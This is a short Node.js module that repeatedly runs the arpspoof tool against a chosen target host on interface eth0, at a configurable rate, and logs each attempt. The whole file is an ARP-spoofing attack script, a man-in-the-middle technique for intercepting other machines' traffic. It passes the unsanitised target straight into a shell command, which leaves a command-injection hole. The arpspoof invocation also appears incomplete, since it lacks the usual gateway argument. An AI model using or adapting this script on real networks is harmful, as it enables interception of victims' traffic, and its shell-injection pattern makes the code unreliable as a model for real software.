const { exec } = require('child_process');

function arpSpoofing(target, rateLimit, logOutput) {
    setInterval(() => {
        exec(`arpspoof -i eth0 -t ${target}`, (err, stdout, stderr) => {
            if (err) {
                logOutput('Error: ' + err.message);
            } else {
                logOutput('ARP spoofing packet sent');
            }
        });
    }, 1000 / rateLimit);
}

module.exports = arpSpoofing;
